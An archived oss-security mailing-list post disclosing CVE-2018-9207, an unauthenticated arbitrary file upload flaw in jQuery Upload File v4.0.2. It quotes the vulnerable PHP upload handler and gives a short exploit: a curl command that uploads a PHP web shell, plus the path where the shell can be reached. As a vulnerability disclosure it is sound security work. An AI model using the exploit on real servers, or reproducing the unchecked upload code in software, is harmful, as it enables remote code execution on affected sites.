X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["1741" "Tuesday" "20" "November" "2018" "17:07:09" "-0500" "Larry W. Cashdollar" "larry0@me.com" "<0677039D-F0D3-4CE6-98B1-7D688CBBC375@me.com>" "43" "[oss-security] Arbitrary file upload vulnerability in jQuery Upload File v4.0.2" nil nil nil "11" "2018112022:07:09" "[oss-security] Arbitrary file upload vulnerability in jQuery Upload File v4.0.2" (number mark "U       larry0@me.co Nov 20   43/1741  " thread-indent "\"[oss-security] Arbitrary file upload vulnerability in jQuery Upload File v4.0.2\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 20002 invoked by uid 550); 20 Nov 2018 22:07:27 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 19958 invoked from network); 20 Nov 2018 22:07:27 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=me.com; s=04042017;
	t=1542751635; bh=+DJXIv54KX/y/CgBzFZW+qxWsZHg4wEE9dUX51F4aEc=;
	h=Date:Subject:From:To:Message-id:MIME-version:Content-type;
	b=6iUha84QCpJPTljw5wCoIy3vbY6QSUW+9Bym+ynnGt0GDPA35ppCCLOvQogZDYspI
 aaW8/KgdYvF+2sL0HGlpDKNAm8V2HMJ7wZ0SzTCmwTUTps33HIYf6I4EUqF+MtBYfo
 HRJDmSf6PdvPNIY23qHfMTsM9gjTfbh7pTFkMtAZPXvwckw7wegaVEQx7uixJa/ZYU
 irA20ysONsOEsFXvW3jrPmBZJ5MQ/gpm0gVzb11uq3TCPPLeuMNtm/FIbkEHjDUJRb
 gxHXqypsL0YyR/kjmN5kw7Z+EWGuHeUp8NRxXs49ePDZBPZAAyVxg5xII6jyrYAty9
 FDuOh9jOYXFLA==
X-Proofpoint-Spam-Details: rule=notspam policy=default score=0 suspectscore=0
 malwarescore=0 phishscore=0 bulkscore=0 spamscore=0 clxscore=1015 mlxscore=0
 mlxlogscore=999 adultscore=0 classifier=spam adjust=0 reason=mlx scancount=1
 engine=8.0.1-1807170000 definitions=main-1811200194
X-Proofpoint-Virus-Version: vendor=fsecure engine=2.50.10434:,,
 definitions=2018-11-20_10:,, signatures=0
User-Agent: Microsoft-MacOutlook/10.13.0.181109
Date: Tue, 20 Nov 2018 17:07:09 -0500
From: "Larry W. Cashdollar" <larry0@me.com>
To: Open Security <oss-security@lists.openwall.com>
Message-id: <0677039D-F0D3-4CE6-98B1-7D688CBBC375@me.com>
Thread-topic: Arbitrary file upload vulnerability in jQuery Upload File v4.0.2
MIME-version: 1.0
Content-type: text/plain; charset=UTF-8
Content-transfer-encoding: quoted-printable
Subject: [oss-security] Arbitrary file upload vulnerability in jQuery Upload File v4.0.2

Title:=C2=A0Arbitrary file upload vulnerability in Hayageek jQuery Upload F=
ile v4.0.2
Author:=C2=A0Larry W. Cashdollar, @_larry0
Date:=C2=A02018-11-02
CVE-ID:[ CVE-2018-9207
CWE:=C2=A0CWE-434 arbitrary file upload
Download Site:=C2=A0http://hayageek.com/docs/jquery-upload-file.php
Vendor:=C2=A0Hayageek
Vendor Notified:=C2=A02018-11-02
Vendor Contact:=C2=A0hayageek@gmail.com
Advisory:=C2=A0http://www.vapidlabs.com/advisory.php?v=3D206

Description:=C2=A0jQuery Upload File plugin provides Multiple file Uploads =
with progress bar.Works with any server-side platform (Google App Engine, P=
HP, Python, Ruby on Rails, Java, etc.) that supports standard HTML form fil=
e uploads.

Vulnerability:
The code in https://github.com/hayageek/jquery-upload-file/blob/master/php/=
upload.php doesn't check for a file type or for requiring any authenticatio=
n allowing a user to upload an executable file to the /uploads/ directory i=
f it exists. if(!is_array($_FILES["myfile"]["name"])) //single file { $file=
Name =3D $_FILES["myfile"]["name"]; move_uploaded_file($_FILES["myfile"]["t=
mp_name"],$output_dir.$fileName); $ret[]=3D $fileName; } else //Multiple fi=
les, file[] { $fileCount =3D count($_FILES["myfile"]["name"]); for($i=3D0; =
$i < $fileCount; $i++) { $fileName =3D $_FILES["myfile"]["name"][$i]; move_=
uploaded_file($_FILES["myfile"]["tmp_name"][$i],$output_dir.$fileName); $re=
t[]=3D $fileName; }

Exploit Code:
1. $ curl  -F  "myfile=3D@shell.php" "http://example.com/jquery-upload-file=
/php/upload.php"
2. ["shell.php"]
3. =C2=A0
4. Where shell is https://github.com/lcashdol/shittyshell/blob/master/shitt=
yshell.php
5. =C2=A0
6. =C2=A0
7. Shell is located http://example.com/jquery-upload-file/php/uploads/shell=
.php



